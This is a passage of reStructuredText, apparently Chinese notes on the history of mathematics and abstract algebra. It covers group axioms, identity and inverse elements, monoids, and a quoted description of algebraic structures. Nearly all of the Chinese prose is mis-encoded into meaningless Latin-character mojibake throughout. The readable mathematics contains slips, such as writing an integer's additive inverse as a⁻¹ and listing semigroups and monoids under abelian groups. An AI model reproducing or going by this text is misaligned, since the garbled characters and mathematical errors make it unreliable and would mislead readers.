      ‰ªñÂèàÂ±û‰∫é‚ÄúËá™Â∑±ÂàÆËÉ°Â≠êÁöÑ‰∫∫‚ÄùÔºå‰ªñÂ∞±‰∏çËØ•ÁªôËá™Â∑±ÂàÆËÉ°Â≠ê„ÄÇ‰∫éÊòØ‰∫ßÁîüÁüõÁõæ„ÄÇ


   1950 Âπ¥‰ª£ÊòØÊï∞Â≠¶ÂèëÂ±ïÂè≤‰∏äÁöÑ‰∏Ä‰∏™ÈáçË¶ÅËΩ¨ÊäòÁÇπÔºåÂæóÁõä‰∫éËÆ°ÁÆóÊú∫ÁöÑÂèëÂ±ïÔºåÊï∞Â≠¶ÂÆ∂‰ª¨ÁöÑÁ†îÁ©∂Âú®Âº∫Â§ßÁöÑËÆ°ÁÆóÂ∑•ÂÖ∑ÁöÑÊîØÊåÅ‰∏ãÔºå
   Á∫∑Á∫∑ÂºÄËæüÂá∫Êñ∞ÁöÑÁ†îÁ©∂È¢ÜÂüü„ÄÇËÆ°ÁÆóÊï∞Â≠¶„ÄÅËÆ°ÁÆóÂá†‰Ωï„ÄÅÊï∞ÂÄºÂàÜÊûêÁ≠âÂ≠¶ÁßëËøÖÈÄüÂÖ¥Ëµ∑Ôºå‰∏∫Êï∞Â≠¶ÁöÑÂèëÂ±ïÊ≥®ÂÖ•‰∫ÜÊñ∞ÁöÑÊ¥ªÂäõ„ÄÇ

   1960 Âπ¥ÔºåÊãìÊâëÂ≠¶ÂíåÂá†‰ΩïÂ≠¶Êàê‰∏∫Êï∞Â≠¶Á†îÁ©∂ÁöÑÁÉ≠ÁÇπÈ¢ÜÂüü„ÄÇÁî±‰∫éÊäΩË±°‰ª£Êï∞ÁöÑÂèëÂ±ïÔºåÊãìÊâëÂ≠¶ÂíåÂá†‰ΩïÂ≠¶ÂæóÂà∞‰∫ÜÊõ¥Ê∑±ÂÖ•ÁöÑÁêÜËß£
   ÂíåÂ∫îÁî®„ÄÇÊ≠§Â§ñÔºåÊãìÊâëÂ≠¶ÁöÑÂèëÂ±ïËøòÊé®Âä®‰∫ÜÊãìÊâëÂä®ÂäõÁ≥ªÁªüÂíåÊ∑∑Ê≤åÁêÜËÆ∫ÁöÑÁ†îÁ©∂„ÄÇ

   1970 Âπ¥ÔºåÊï∞Â≠¶ÂèëÂ±ïÁöÑÂèà‰∏Ä‰∏™ÈáçË¶ÅÊó∂ÊúüÔºåÊï∞Â≠¶Â∫îÁî®È¢ÜÂüüÂæóÂà∞‰∫ÜÂπøÊ≥õÁöÑÊãìÂ±ï„ÄÇËøêÁ≠πÂ≠¶„ÄÅ‰ºòÂåñÁêÜËÆ∫„ÄÅÊéßÂà∂ËÆ∫Á≠âÂ∫îÁî®Êï∞Â≠¶
   Â≠¶ÁßëËøÖÈÄüÂèëÂ±ïÔºå‰∏∫Â∑•Á®ã„ÄÅÁÆ°ÁêÜ„ÄÅÁªèÊµéÁ≠âÈ¢ÜÂüüÊèê‰æõ‰∫ÜÂº∫ÊúâÂäõÁöÑÂ∑•ÂÖ∑„ÄÇ‰∏éÊ≠§ÂêåÊó∂ÔºåÊï∞Â≠¶Âü∫Á°ÄÁöÑÁ†îÁ©∂‰πüÂú®‰∏çÊñ≠Ê∑±ÂåñÔºå
   Á∫ØÊï∞Â≠¶Â≠¶ÁßëÁöÑÁ†îÁ©∂ÊàêÊûú‰∏∫Â∫îÁî®Êï∞Â≠¶Êèê‰æõ‰∫ÜÂùöÂÆûÁöÑÂü∫Á°Ä„ÄÇ

   1980 Âπ¥‰ª£Ëá≥‰ªäÔºåÊï∞Â≠¶ÁöÑÂèëÂ±ïÂëàÁé∞Âá∫Â§öÊ†∑ÂåñÁöÑË∂ãÂäø„ÄÇÂú®Ëøô‰∏™Êó∂ÊúüÔºåÊï∞Â≠¶ÁöÑÂàÜÊîØÂ≠¶ÁßëÊó•ÁõäÁªÜÂåñÔºåÁ†îÁ©∂ÁöÑÊñπÂêë‰πüÊõ¥Âä†
   ‰∏ì‰∏öÂåñ„ÄÇÊï∞Â≠¶ÁöÑ‰∫§ÂèâÂ≠¶ÁßëÁ†îÁ©∂Êàê‰∏∫‰∏Ä‰∏™Êñ∞ÁöÑÁ†îÁ©∂ÁÉ≠ÁÇπÔºå‰∏çÂêåÂ≠¶Áßë‰πãÈó¥ÁöÑ‰∫§ÊµÅÂíåÂêà‰ΩúÊé®Âä®‰∫ÜÊï∞Â≠¶ÁöÑÂø´ÈÄüÂèëÂ±ï„ÄÇÊï∞Â≠¶
   Â∫îÁî®È¢ÜÂüü‰πüËøõ‰∏ÄÊ≠•Êâ©Â±ïÔºåÊï∞ÊçÆÁßëÂ≠¶„ÄÅ‰∫∫Â∑•Êô∫ËÉΩÁ≠âÊñ∞ÂÖ¥È¢ÜÂüüÊ∂åÁé∞Âá∫‰∏ÄÂ§ßÊâπÊï∞Â≠¶ÂÆ∂„ÄÇ


   ‰ª£Êï∞„ÄÅÂàÜÊûê„ÄÅÂá†‰ΩïÊòØÁé∞‰ª£Êï∞Â≠¶ÁöÑ‰∏âÂ§ßÂü∫Á°ÄÂàÜÊîØÔºåÂÆÉ‰ª¨ÈÉΩÂü∫‰∫éÈõÜÂêàËÆ∫Ëøô‰∏ÄÂü∫Á°ÄÁöÑÊï∞Â≠¶ËØ≠Ë®Ä„ÄÇM. Hale ÁªòÂà∂
   ÁöÑÊï∞Â≠¶ÂàÜÊîØÊ†ëÂΩ¢ËÉΩÊõ¥ÁÆÄÊòéÂú∞ÂëàÁé∞‰∏∞ËåÇÁöÑÊï∞Â≠¶ÂàÜÊîØÔºå‰ª•ÂèäÈÄªËæë‰∏éÈõÜÂêàËØ≠Ë®ÄÂú®Êï∞Â≠¶È¢ÜÂüü‰∏≠ÁöÑÂü∫Á°Ä‰ΩúÁî®Ôºö

   .. figure:: https://users.quipo.it/base5/scuola/mate_metafor_albero1.png
      :target: https://users.quipo.it/base5/scuola/mate_metafor.htm

      The Tree of Mathematics, ¬©2002 M Hale

      `La matematica come albero 2 <https://www2.stetson.edu/~mhale/logic/tree.htm>`__

      Credit: Margie Hale Professor of Mathematics, Emeritus, Department of Mathematics and Computer Science, Stetson University

   ÁÆóÊúØÔºàarithmeticÔºâÊó†ÁñëÊòØÊï∞Â≠¶‰∏≠ÊúÄÂè§ËÄÅ„ÄÅÊúÄÂàùÁ≠âÁöÑÊï∞Â≠¶„ÄÇÁÆóÊúØÁ†îÁ©∂Êï∞ÁöÑÊÄßË¥®ÂèäÂÖ∂ËøêÁÆóÔºåÊúÄÂ§ßÁöÑÁâπÁÇπÊòØ
   ÂÖ≥Ê≥®Êï∞Â≠ó„ÄÇÁÆóÊúØÊòØÊääÊï∞ÂíåÊï∞ÁöÑÊÄßË¥®„ÄÅÊï∞ÂíåÊï∞‰πãÈó¥ÁöÑÂõõÂàôËøêÁÆóÂú®Â∫îÁî®ËøáÁ®ã‰∏≠ÁöÑÁªèÈ™åÁ¥ØÁßØËµ∑Êù•ÔºåÂπ∂Âä†‰ª•Êï¥ÁêÜÔºå
   ÂΩ¢ÊàêÁöÑÊúÄÂè§ËÄÅÁöÑ‰∏ÄÈó®Êï∞Â≠¶„ÄÇÁÆóÊúØËøêÁÆó‰∏ç‰ªÖ‰ªÖÊåáÂä†Âáè‰πòÈô§ÔºåËøòÂèØ‰ª•ÂàÜÊï∞„ÄÅÂπ≥ÊñπÊ†π„ÄÅÂèñÂπÇÂíåÂØπÊï∞ÔºõÂØπË±°ÂåÖÊã¨
   Ëá™ÁÑ∂Êï∞„ÄÅÊï¥Êï∞„ÄÅÊúâÁêÜÊï∞ÂíåÂÆûÊï∞„ÄÅÂ§çÊï∞„ÄÇ

   ÂàùÁ≠â‰ª£Êï∞Ôºàelementary algebraÔºâÊòØÂè§ËÄÅÁÆóÊúØÁöÑÊé®Âπø‰∏éÂèëÂ±ï„ÄÇÂú®Âè§‰ª£ÔºåÁÆóÊúØÁßØÁ¥Ø‰∫ÜÂ§ßÈáèÊï∞ÈáèÈóÆÈ¢òÁöÑËß£Ê≥ïÔºå
   ‰∏∫ÂØªÊ±ÇÊõ¥Á≥ªÁªü„ÄÅÊõ¥ÊôÆÈÅçÁöÑÂêÑÁßçÊï∞ÈáèÂÖ≥Á≥ªÁöÑÊ±ÇËß£ÊñπÊ≥ïÔºå‰∫ßÁîü‰∫Ü‰ª•Ëß£ÊñπÁ®ãÔºàequationsÔºâ‰∏∫‰∏≠ÂøÉÁöÑÂàùÁ≠â‰ª£Êï∞„ÄÇ
   Ê†πÊçÆÂÆûÈôÖÈóÆÈ¢òÁöÑÊï∞ÈáèÂÖ≥Á≥ªÔºà‰ª£Êï∞ÂºèÔºöÊï¥Âºè„ÄÅÂàÜÂºè„ÄÅÊ†πÂºèÔºâ„ÄÅÁ≠âÈáèÂÖ≥Á≥ªÊàñËÄÖ‰∏çÁ≠âÂºèÔºåÂàóÂá∫ÂàóÂá∫ÊñπÁ®ãÊàñËÄÖÊñπÁ®ãÁªÑ„ÄÇ
   ÊñπÁ®ãÔºàÁªÑÔºâÂåÖÊã¨Ôºö

      1. ‰∏ÄÂÖÉ‰∏ÄÊ¨°ÊñπÁ®ãÔºàlinear equations with one variableÔºâ
      2. ‰∫åÂÖÉ‰∏ÄÊ¨°ÊñπÁ®ãÔºàlinear equations with two variableÔºâ
      3. ‰∏ÄÂÖÉ‰∫åÊ¨°ÊñπÁ®ãÔºàquadratic equationsÔºâ
      4. ÊåáÊï∞„ÄÅÂØπÊï∞ÊñπÁ®ãÔºàexponential and logarithmic equationsÔºâ
      5. Êó†ÁêÜÊñπÁ®ãÔºàradical equationsÔºâ
      6. Á∫øÊÄßÊñπÁ®ãÁªÑÔºàsystem of linear equationsÔºâ

   È´òÁ≠â‰ª£Êï∞Áõ∏ÂØπ‰∫éÂàùÁ≠â‰ª£Êï∞ËÄåË®ÄÔºåÊú¨Ë¥®‰∏äÊòØ‰∏Ä‰∏™‰∏úË•øÔºåÂè™ÊòØÊõ¥Âä†Á≥ªÁªüÔºåÊâ©Â±ï‰∫ÜÊ∑±Â∫¶‰∏éÂπøÂ∫¶„ÄÇ

   ÂàùÁ≠â‰ª£Êï∞ÂÜçËøõ‰∏ÄÊ≠•Ê≥õÂåñÊé®ÂπøÔºàgeneralizationÔºâÂ∞±ÂΩ¢Êàê‰∫ÜÊäΩË±°‰ª£Êï∞ÔºåÂÆÉ‰∏éÂàùÁ≠â‰ª£Êï∞ÁöÑÁïåÈôêÂú®‰∫éÔºö
   ÂàùÁ≠â‰ª£Êï∞Âè™ËÄÉËôëÂÆûÊï∞ÂíåÂ§çÊï∞‰ª£Êï∞ÁªìÊûÑ„ÄÇ

   ÊäΩË±°‰ª£Êï∞Ôºàabstract algebraÔºâ„ÄÅËøë‰∏ñ‰ª£Êï∞„ÄÅÁé∞‰ª£‰ª£Êï∞Ôºàmodern algebraÔºâÊòØÂêå‰∏Ä‰∏™ÊÑèÊÄùÔºåÁîöËá≥ÁÆÄÁß∞
   ‰∏∫‰ª£Êï∞Â≠¶„ÄÇ‰∏ªË¶ÅÁ†îÁ©∂ÂØπË±°ÊòØ‰ª£Êï∞ÁªìÊûÑÔºöÁæ§ÔºàGroupÔºâ„ÄÅÁéØÔºàRingÔºâ„ÄÅÂüüÔºàFieldÔºâ„ÄÅÂêëÈáèÁ©∫Èó¥ÔºàVector spaceÔºâ„ÄÇ

   Áæ§ÔºàGroupÔºâÂç≥Êª°Ë∂≥Áæ§ÂÖ¨ÁêÜÔºàgroup axiomsÔºâÂõõ‰∏™Âü∫Êú¨ÊÄßË¥®ÁöÑ‰ª£Êï∞ÁªìÊûÑ‰∏éËøêÁÆóÁöÑÊûÑÊàêÁöÑÁæ§ÁªÑ„ÄÇ
   ÂÅáÂ¶ÇÔºåÈùûÁ©∫ÈõÜÂêàËÆ∞‰Ωú GÔºåËøêÁÆóËÆ∞‰Ωú ¬∑ÔºåÂπ∂‰∏îÊª°Ë∂≥Áæ§ÂÖ¨ÁêÜÁöÑÂõõ‰∏™ÊÄßË¥®Ôºö

      *  Â∞ÅÈó≠ÊÄßÔºàclosureÔºâÔºöÂØπ‰∫é G Áæ§‰∏≠ÊâÄÊúâÁöÑ a, bÔºåËøêÁÆó a‚Ä¢b ÁöÑÁªìÊûú‰πüÂú® G Áæ§‰∏≠Ôºõ
      *  ÁªìÂêàÂæãÔºàAssociativityÔºâÔºöÂØπ‰∫é G Áæ§‰∏≠ÊâÄÊúâÁöÑ a, b Âíå cÔºåÁ≠âÂºè (a‚Ä¢b)‚Ä¢c = a‚Ä¢(b‚Ä¢c) ÊàêÁ´ãÔºõ
      *  Âçï‰ΩçÂÖÉÔºàÂπ∫ÂÖÉÔºåIdentity elementÔºâÔºöÂ≠òÂú® G ‰∏≠ÁöÑ‰∏Ä‰∏™ÂÖÉÁ¥† eÔºå‰ΩøÂæó G Áæ§ÊâÄÊúâÁöÑÂÖÉÁ¥† aÔºåÊÄªÊúâÁ≠âÂºè e‚Ä¢a = a‚Ä¢e = a ÊàêÁ´ãÔºõ
      *  ÈÄÜÂÖÉÔºàinverse elementÔºâÔºöÂØπ‰∫éÊØè‰∏™ G ‰∏≠ÁöÑ aÔºåÂ≠òÂú® G ‰∏≠ÁöÑ‰∏Ä‰∏™ÂÖÉÁ¥† b ‰ΩøÂæóÊÄªÊúâ a‚Ä¢b = b‚Ä¢a = eÔºåÊ≠§Â§Ñ e ‰∏∫Âçï‰ΩçÂÖÉÔºõ

   ‰ª•‰∏äÂÆö‰πâ‰∏≠ÁöÑ‚ÄúÂÖÉ‚ÄùÊòØÂÖÉÁ¥†ÔºàelementÔºâÁöÑÁÆÄÁß∞„ÄÇ‚ÄúÂπ∫‚ÄùÊÑè‰∏∫Êï∞Â≠ó‰∏ÄÔºåÂç≥Âçï‰ΩçÂÖÉÔºàIdentity elementÔºâ„ÄÇ
   Âçï‰ΩçÂÖÉÂú®Êï∞Â≠¶‰∏≠ÁöÑ‰ΩúÁî®ÁâπÁÇπÂ∞±ÊòØÔºöÂçïÂÖÉÂíåÂÖ∂‰ªñÂÖÉÁ¥†ÁªìÂêàÊó∂ÔºåÂπ∂‰∏ç‰ºöÊîπÂèòÈÇ£‰∫õÂÖÉÁ¥†„ÄÇÔºåÂêåÊ†∑ÁöÑÊï∞Â≠¶ÁªìÊûÑÔºå
   ‰∏çÂêåÁöÑËøêÁÆóÊúâ‰∏çÂêåÁöÑÂçï‰ΩçÂÖÉ„ÄÇËÄåÈÄÜÂÖÉÔºàinverse elementÔºâ‰∏éÂçï‰ΩçÂÖÉÂØÜÂàáÁõ∏ÂÖ≥ÔºåÂØπ‰ªªÊÑè‰∏Ä‰∏™ÂÖÉÁ¥† a ‰∏é
   ÂÆÉÁöÑÈÄÜÂÖÉ ie‚Çê ÁªÑÂêàÁªìÊûúÂ∞±ÊòØÂÖ∂Âçï‰ΩçÂÖÉ id‚Çê„ÄÇÊúâËÆ∏Â§öÂ∏∏ËßÅÁöÑÂçï‰ΩçÂÖÉÔºåÊØîÂ¶ÇÔºö

      *  ÂÆûÊï∞Âä†Ê≥ïÁöÑ 0ÔºåÂÆûÊï∞‰πòÊ≥ïÁöÑ 1ÔºåËøô‰∏§‰∏™Êï∞Â≠ó‰ºöÂú®Áæ§‰ª£Êï∞‰∏≠ÊäΩË±°‰∏∫Âçï‰ΩçÂÖÉÔºõ
      *  ‚àßÔºàÈÄªËæë‰∏éÔºâ‰∏≠ÁöÑ ‚ä§ÔºàÁúüÂÄºÔºâÔºå‚à®ÔºàÈÄªËæëÊàñÔºâ‰∏≠ÁöÑ ‚ä•ÔºàÂÅáÂÄºÔºâÔºõ
      *  Áü©Èòµ‰πòÊ≥ï‰∏≠ÁöÑÂçï‰ΩçÁü©Èòµ„ÄÅÁü©ÈòµÂä†Ê≥ï‰∏≠ÁöÑÈõ∂Áü©Èòµ„ÄÇ

   Êï∞Â≠¶ÂÆö‰πâÔºöËã•ÈõÜÂêà GÔºåÂú® G ‰∏äÁöÑ‰∫åÂÖÉËøêÁÆóÔºà‰ΩøÁî® ‚Ä¢ Êàñ * Á¨¶Âè∑Ë°®Á§∫‰∫åÂÖÉËøêÁÆóÔºâÊûÑÊàêÁöÑ‰ª£Êï∞ÁªìÊûÑÔºå
   ‚Ä¢:G ‚Ä¢ G -> G ËÆ∞‰Ωú {G,‚Ä¢}ÔºåÊª°Ë∂≥‰ª•‰∏äÂõõÁÇπÔºåÂú®Êó†Ê≠ß‰πâÊó∂ÔºåÂèØÂ∞Ü a‚Ä¢b ÂÜôÊàê ab„ÄÇ‰ªéÂÆö‰πâ‰∏äÂèØ‰ª•ÁêÜËß£Ôºå

   ‰∏æ‰∏™‰æãÂ≠êÔºåÊï¥Êï∞ÔºàÈõÜÂêàÔºâÂíåÂä†Ê≥ïÔºàËøêÁÆóÔºâÊûÑÊàêÁöÑ‰∏Ä‰∏™Áæ§Ôºö

      *  Â∞ÅÈó≠ÊÄßÔºöÂØπ‰∫é‰ªª‰Ωï‰∏§‰∏™Êï¥Êï∞ a Âíå bÔºåÂÆÉ‰ª¨ÁöÑÂíå a + b ‰πüÊòØÊï¥Êï∞
      *  ÁªìÂêàÂæãÔºöÂØπ‰∫é‰ªª‰ΩïÊï¥Êï∞ a, b Âíå cÔºå(a + b) + c = a +Ôºàb + cÔºâ
      *  Âπ∫ÂÖÉÔºöÂ¶ÇÊûú a ÊòØ‰ªª‰ΩïÊï¥Êï∞ÔºåÈÇ£‰πà 0 + a = a + 0 = a
      *  ÈÄÜÂÖÉÔºöÂØπ‰∫é‰ªª‰ΩïÊï¥Êï∞ aÔºåÂ≠òÂú®Âè¶‰∏Ä‰∏™Êï¥Êï∞ b ‰ΩøÂæó a + b = b + a = 0ÔºåÊï¥Êï∞ b Âè´ÂÅöÊï¥Êï∞ a ÁöÑÈÄÜÂÖÉÔºåËÆ∞‰∏∫ a‚Åª¬π

   ‰ª•‰∏ä G Â∞±Áß∞‰∏∫‰∏Ä‰∏™Âä†Ê≥ïÁæ§„ÄÇÁ±ª‰ººÂú∞ÔºåÂèØ‰ª•ÂÆö‰πâ‰πòÊ≥ïÁæ§„ÄÇÂÖ∂ÂÆÉÁæ§Ê¶ÇÂøµÔºö

   *  ÂéüÁæ§ÔºàmagmaÔºâÔºåÂØπ‰πòÊ≥ïÂ∞ÅÈó≠ÁöÑÈõÜÂêà„ÄÇ

   *  ÈòøË¥ùÂ∞îÁæ§ÔºàAbelian groupsÔºâÔºåÂèàÁß∞‰∫§Êç¢Áæ§/Âä†Áæ§ÔºåÂç≥Êª°Ë∂≥‰∫§Êç¢ÂæãÁöÑÁæ§Ôºõ

      *  ÂçäÁæ§ÔºàSemigroupsÔºâÔºö‰ªÖÊª°Ë∂≥Áæ§ÂÆö‰πâ‰∏≠Â∞ÅÈó≠ÊÄß‰∏éÁªìÂêàÂæãÔºõ
      *  Âπ∫ÂçäÁæ§ÔºàMonoidÔºâÔºö‰ªÖÊª°Ë∂≥Áæ§ÂÆö‰πâ‰∏≠Â∞ÅÈó≠ÊÄß„ÄÅÁªìÂêàÂæã„ÄÅÂçï‰ΩçÂÖÉ„ÄÇ

   *  Âæ™ÁéØÁæ§ÔºàCyclic groupsÔºâÔºö

      *  Âæ™ÁéØÁæ§ÊòØÂÖ∂ÊâÄÊúâÂÖÉÁ¥†ÈÉΩÊòØÁâπÂÆöÂÖÉÁ¥† a ÁöÑÂπÇÁöÑÁæ§„ÄÇa Áß∞‰∏∫ÁîüÊàêÂÖÉÊàñÊú¨ÂéüÂÖÉ„ÄÇ

   Âπ∫ÂçäÁæ§ÔºàMonoidÔºâÊòØ‰∏Ä‰∏™Áõ∏ÂΩìÁÆÄÂçï‰ΩÜÊòØÂäüËÉΩÂº∫Â§ßÁöÑÊ¶ÇÂøµ„ÄÇÂÆÉÊòØÂü∫Êú¨ÁÆóÊï∞ÂπïÂêéÁöÑÊ¶ÇÂøµÔºöÂè™Ë¶ÅÊúâÂä†Ê≥ïÊàñ‰πòÊ≥ïËøêÁÆó
   Â∞±ÂèØ‰ª•ÂΩ¢ÊàêÂπ∫ÂçäÁæ§„ÄÇÂú®ÁºñÁ®ã‰∏≠ÔºåÂπ∫ÂçäÁæ§Êó†Â§Ñ‰∏çÂú®„ÄÇÂÆÉ‰ª¨Ë°®Áé∞‰∏∫Â≠óÁ¨¶‰∏≤„ÄÅÂàóË°®„ÄÅÂèØÊäòÂè†Êï∞ÊçÆÁªìÊûÑÔºåÂπ∂ÂèëÁºñÁ®ãÊú™Êù•ÁöÑ
   ‰∏Ä‰∫õ‰∏úË•øÔºåÂáΩÊï∞ÂºèÂìçÂ∫îÁºñÁ®ã‰∏≠ÁöÑ‰∫ã‰ª∂Á≠âÁ≠â„ÄÇ

   Á∫øÊÄß‰ª£Êï∞Ôºàlinear algebraÔºâÊòØÊäΩË±°‰ª£Êï∞ÁâπÊÆäÂΩ¢ÂºèÔºåÂÖ∂‰ª£Êï∞ÁªìÊûÑ‰∏∫ÔºöÂêëÈáèÁ©∫Èó¥Ôºàvector spacesÔºâ
   ‰ª•ÂèäÁ∫øÊÄßÂèòÊç¢Ôºàlinear mappingsÔºâÔºåÂêëÈáèÁ©∫Èó¥‰πüÁß∞‰∏∫Á∫øÊÄßÁ©∫Èó¥Ôºàliner spacesÔºâ„ÄÇ

   Âú®Êï∞Â≠¶ÂíåÊäΩË±°‰ª£Êï∞‰∏≠ÔºåÁæ§ËÆ∫Á†îÁ©∂Âêç‰∏∫Áæ§ÔºàGroupÔºâÁöÑ‰ª£Êï∞ÁªìÊûÑ„ÄÇÁæ§Âú®ÊäΩË±°‰ª£Êï∞‰∏≠ÂÖ∑ÊúâÂü∫Êú¨ÁöÑÈáçË¶ÅÂú∞‰ΩçÔºö
   ËÆ∏Â§ö‰ª£Êï∞ÁªìÊûÑÔºåÂåÖÊã¨ÁéØ„ÄÅÂüüÂíåÊ®°Á≠âÂèØ‰ª•Áúã‰ΩúÊòØÂú®Áæ§ÁöÑÂü∫Á°Ä‰∏äÊ∑ªÂä†Êñ∞ÁöÑËøêÁÆóÂíåÂÖ¨ÁêÜËÄåÂΩ¢ÊàêÁöÑ„ÄÇÁæ§ÁöÑÊ¶ÇÂøµÂú®Êï∞Â≠¶ÁöÑ
   ËÆ∏Â§öÂàÜÊîØÈÉΩÊúâÂá∫Áé∞ÔºåËÄå‰∏îÁæ§ËÆ∫ÁöÑÁ†îÁ©∂ÊñπÊ≥ï‰πüÂØπÊäΩË±°‰ª£Êï∞ÁöÑÂÖ∂ÂÆÉÂàÜÊîØÊúâÈáçË¶ÅÂΩ±Âìç„ÄÇÁæ§ËÆ∫ÁöÑÈáçË¶ÅÊÄßËøò‰ΩìÁé∞Âú®Áâ©ÁêÜÂ≠¶
   ÂíåÂåñÂ≠¶ÁöÑÁ†îÁ©∂‰∏≠ÔºåÂõ†‰∏∫ËÆ∏Â§ö‰∏çÂêåÁöÑÁâ©ÁêÜÁªìÊûÑÔºåÂ¶ÇÊô∂‰ΩìÁªìÊûÑÂíåÊ∞¢ÂéüÂ≠êÁªìÊûÑÂèØ‰ª•Áî®Áæ§ËÆ∫ÊñπÊ≥ïÊù•ËøõË°åÂª∫Ê®°„ÄÇ

   Áé∞‰ª£Êï∞Â≠¶ÁªèÂ∏∏Ê∂âÂèä‰∏Ä‰∏™ÊúØËØ≠:‰ª£Êï∞ÁªìÊûÑÔºàalgebraic structureÔºâÔºåÂÆÉÊòØÊï∞Â≠¶Á†îÁ©∂ÁöÑÂØπË±°„ÄÇ‰∏çÂêåÁöÑÊï∞Â≠¶ÂàÜÊîØ
   ‰ΩøÁî®‰∏çÂêåÁöÑÊï∞Â≠¶ÁªìÊûÑÁªüÁß∞Ôºå‰πüÁß∞ÂÖ≥Á≥ªÁªìÊûÑÔºåÁÆÄÁß∞ÁªìÊûÑ„ÄÇ‰ª£Êï∞ÁªìÊûÑÂèØ‰ª•‰ªé‰∏çÂêåËßíÂ∫¶ÊèèËø∞ÔºåÁôæÂ∫¶ÁôæÁßëÊèèËø∞‰∏∫Ôºö
   ‰ª£Êï∞ÊòØÁ†îÁ©∂Êï∞„ÄÅÊï∞Èáè„ÄÅÂÖ≥Á≥ª‰∏éÁªìÊûÑÁöÑÊï∞Â≠¶ÂàÜÊîØ„ÄÇMIT ËÆ°ÁÆóÊú∫ËßÜËßâ‰∏ì‰∏öÊûóËææÂçéÂú®„ÄäÂú®Êï∞Â≠¶ÁöÑÊµ∑Ê¥ã‰∏≠È£òËç°„Äã ‰∏ÄÊñáÊèèËø∞Ôºö

      ‰ª£Êï∞‚Äî‚ÄîÂêçÁß∞‰∏äÁ†îÁ©∂ÁöÑ‰ºº‰πéÊòØÊï∞ÔºåÂú®ÊàëÁúãÊù•Ôºå‰∏ªË¶ÅÁ†îÁ©∂ÁöÑÊòØËøêÁÆóËßÑÂàô„ÄÇ‰∏ÄÈó®‰ª£Êï∞ÔºåÂÖ∂ÂÆûÈÉΩÊòØ‰ªéÊüêÁßç
      ÂÖ∑‰ΩìÁöÑËøêÁÆó‰ΩìÁ≥ª‰∏≠ÊäΩË±°Âá∫‰∏Ä‰∫õÂü∫Êú¨ËßÑÂàôÔºåÂª∫Á´ã‰∏Ä‰∏™ÂÖ¨ÁêÜ‰ΩìÁ≥ªÔºåÁÑ∂ÂêéÂú®ËøôÂü∫Á°Ä‰∏äËøõË°åÁ†îÁ©∂„ÄÇ‰∏Ä‰∏™ÈõÜÂêà
      ÂÜçÂä†‰∏ä‰∏ÄÂ•óËøêÁÆóËßÑÂàôÔºåÂ∞±ÊûÑÊàê‰∏Ä‰∏™‰ª£Êï∞ÁªìÊûÑ„ÄÇÂú®‰∏ªË¶ÅÁöÑ‰ª£Êï∞ÁªìÊûÑ‰∏≠ÔºåÊúÄÁÆÄÂçïÁöÑÊòØÁæ§(Group)‚Äî‚ÄîÂÆÉÂè™Êúâ‰∏ÄÁßçÁ¨¶ÂêàÁªìÂêàÁéáÁöÑÂèØÈÄÜËøêÁÆóÔºåÈÄöÂ∏∏Âè´‚Äú‰πòÊ≥ï‚Äù„ÄÇÂ¶ÇÊûúÔºåËøôÁßçËøêÁÆó‰πüÁ¨¶Âêà‰∫§Êç¢ÁéáÔºåÈÇ£‰πàÂ∞±Âè´
      ÈòøË¥ùÂ∞îÁæ§(Abelian Group)„ÄÇÂ¶ÇÊûúÊúâ‰∏§ÁßçËøêÁÆóÔºå‰∏ÄÁßçÂè´Âä†Ê≥ïÔºåÊª°Ë∂≥‰∫§Êç¢ÁéáÂíåÁªìÂêàÁéáÔºå‰∏ÄÁßçÂè´‰πòÊ≥ïÔºå
      Êª°Ë∂≥ÁªìÂêàÁéáÔºåÂÆÉ‰ª¨‰πãÈó¥Êª°Ë∂≥ÂàÜÈÖçÁéáÔºåËøôÁßç‰∏∞ÂØå‰∏ÄÁÇπÁöÑÁªìÊûÑÂè´ÂÅöÁéØ(Ring)ÔºåÂ¶ÇÊûúÁéØ‰∏äÁöÑ‰πòÊ≥ïÊª°Ë∂≥‰∫§Êç¢ÁéáÔºå
      Â∞±Âè´ÂèØ‰∫§Êç¢ÁéØ(Commutative Ring)„ÄÇÂ¶ÇÊûúÔºå‰∏Ä‰∏™ÁéØÁöÑÂä†Ê≥ïÂíå‰πòÊ≥ïÂÖ∑Êúâ‰∫ÜÊâÄÊúâÁöÑËâØÂ•ΩÊÄßË¥®ÔºåÈÇ£‰πàÂ∞±
      Êàê‰∏∫‰∏Ä‰∏™Âüü(Field)„ÄÇÂü∫‰∫éÂüüÔºåÊàë‰ª¨ÂèØ‰ª•Âª∫Á´ã‰∏ÄÁßçÊñ∞ÁöÑÁªìÊûÑÔºåËÉΩËøõË°åÂä†Ê≥ïÂíåÊï∞‰πòÔºåÂ∞±ÊûÑÊàê‰∫ÜÁ∫øÊÄß‰ª£Êï∞
      (Linear algebra)„ÄÇ

      ‰ª£Êï∞ÁöÑÂ•ΩÂ§ÑÂú®‰∫éÔºåÂÆÉÂè™ÂÖ≥ÂøÉËøêÁÆóËßÑÂàôÁöÑÊºîÁªéÔºåËÄå‰∏çÁÆ°ÂèÇ‰∏éËøêÁÆóÁöÑÂØπË±°„ÄÇÂè™Ë¶ÅÂÆö‰πâÊÅ∞ÂΩìÔºåÂÆåÂÖ®ÂèØ‰ª•ËÆ©‰∏ÄÂè™
      Áå´‰πò‰∏ÄÂè™ÁãóÂæóÂà∞‰∏ÄÂ§¥Áå™:-)„ÄÇÂü∫‰∫éÊäΩË±°ËøêÁÆóËßÑÂàôÂæóÂà∞ÁöÑÊâÄÊúâÂÆöÁêÜÂÆåÂÖ®ÂèØ‰ª•ËøêÁî®‰∫é‰∏äÈù¢ËØ¥ÁöÑÁå´Áãó‰πòÊ≥ï„ÄÇ
      ÂΩìÁÑ∂ÔºåÂú®ÂÆûÈôÖËøêÁî®‰∏≠ÔºåÊàë‰ª¨ËøòÊòØÂ∏åÊúõÁî®ÂÆÉÂπ≤ÁÇπÊúâÊÑè‰πâÁöÑ‰∫ãÊÉÖ„ÄÇÂ≠¶ËøáÊäΩË±°‰ª£Êï∞ÁöÑÈÉΩÁü•ÈÅìÔºåÂü∫‰∫éÂá†Êù°ÊúÄ
      ÁÆÄÂçïÁöÑËßÑÂàôÔºåÊØîÂ¶ÇÁªìÂêàÂæãÔºåÂ∞±ËÉΩÂØºÂá∫ÈùûÂ∏∏Â§öÁöÑÈáçË¶ÅÁªìËÆ∫‚Äî‚ÄîËøô‰∫õÁªìËÆ∫ÂèØ‰ª•Â∫îÁî®Âà∞‰∏ÄÂàáÊª°Ë∂≥Ëøô‰∫õÁÆÄÂçïËßÑÂàô
